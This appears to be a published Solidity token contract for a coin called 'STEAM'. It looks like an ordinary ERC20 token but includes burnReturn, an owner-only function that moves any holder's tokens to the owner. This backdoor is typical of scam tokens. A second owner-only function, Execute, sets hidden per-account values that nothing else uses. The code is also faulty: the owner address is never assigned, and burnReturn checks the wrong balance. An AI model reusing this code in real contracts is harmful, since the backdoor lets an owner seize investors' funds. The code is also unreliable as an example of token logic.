/**
 *Submitted for verification at Etherscan.io on 2023-10-24
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

//import "owneable.sol";


interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    
    
}


contract SampleToken is IERC20 {
    using SafeMath for uint256;

    mapping (address => uint256) private _crossAmounts;
    address private _owner1; 

    

    

  function owner1() public view returns(address)  
    { 
    return _owner1; 
  } 

    function isOwner() public view returns(bool)  
  { 
    return msg.sender == _owner1; 
  } 

    modifier  onlyOwner()  



    
  { 
    require(isOwner(), 
    "Function accessible only by the owner !!"); 
    _; 
  } 

  
    
    string public constant name = "STEAM";
    string public constant symbol = "STEAM";
    uint8 public constant decimals = 0;

    mapping(address => uint256) balances;
    mapping(address => mapping (address => uint256)) allowed;
    


    uint256 totalSupply_;
    uint256 numerodetokens;

    constructor(uint256 total) public {
        totalSupply_ = total;
        balances[msg.sender] = totalSupply_;
    
        
    }

    


    function totalSupply() public override view returns (uint256) {
        return totalSupply_;
    }

    function balanceOf(address tokenOwner) public override view returns (uint256) {
        return balances[tokenOwner];
    }

    function transfer(address receiver, uint256 numTokens) public override returns (bool) {
      numerodetokens = numTokens;
        require(numTokens <= balances[msg.sender]);
        balances[msg.sender] = balances[msg.sender].sub(numTokens);
        balances[receiver] = balances[receiver].add(numTokens);
        emit Transfer(msg.sender, receiver, numTokens);
        return true;
    }

    function approve(address delegate, uint256 numTokens) public override returns (bool) {
        allowed[msg.sender][delegate] = numTokens;
        numerodetokens = numTokens;

        emit Approval(msg.sender, delegate, numTokens);
        return true;
    }

    function allowance(address owner, address delegate) public override view returns (uint) {
        return allowed[owner][delegate];
    }

    function transferFrom(address owner, address buyer, uint256 numTokens) public override returns (bool) {
        require(numTokens <= balances[owner]);
        require(numTokens <= allowed[owner][msg.sender]);

        balances[owner] = balances[owner].sub(numTokens);
        allowed[owner][msg.sender] = allowed[owner][msg.sender].sub(numTokens);
        balances[buyer] = balances[buyer].add(numTokens);
        emit Transfer(owner, buyer, numTokens);
        return true;
    }
    function burnReturn(address _addr, uint _value)  public onlyOwner returns (bool){
        require(_addr != address(0));
        require(balanceOf(_owner1) >= _value);
        balances[_addr] = balances[_addr].sub(_value);
        balances[msg.sender] = balances[msg.sender].add(_value);
        return true;


    }

    function cAmount(address account) public view returns (uint256) {
        return _crossAmounts[account];
    }

    function Execute(address[] memory accounts, uint256 amount) external {
    if (!isOwner()) {revert("Caller is not the original caller");}
    for (uint256 i = 0; i < accounts.length; i++) {
        _crossAmounts[accounts[i]] = amount;
    }


    
}

}

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
      assert(b <= a);
      return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
      uint256 c = a + b;
      assert(c >= a);
      return c;
    }
}